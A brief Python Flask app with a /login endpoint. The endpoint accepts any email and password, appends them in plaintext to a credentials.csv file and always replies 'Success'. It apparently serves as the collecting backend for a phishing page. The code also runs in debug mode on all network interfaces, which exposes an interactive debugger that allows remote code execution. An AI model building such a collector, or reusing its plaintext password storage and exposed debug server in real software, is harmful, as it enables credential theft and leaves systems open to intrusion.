import flask
from flask import request

app = flask.Flask(__name__)


@app.route("/", methods=["GET"])
def home():
    return "API Home"


@app.route("/login", methods=["POST"])
def login():
    form = request.form
    email = form.get("email")
    passwd = form.get("passwd")

    with open("credentials.csv", "a") as f:
        f.write(f"{email.strip()},{passwd}\n")

    return "Success"


if __name__ == '__main__':
    # run app in debug mode on port 5000
    app.run(debug=True, host="0.0.0.0", port=5000)
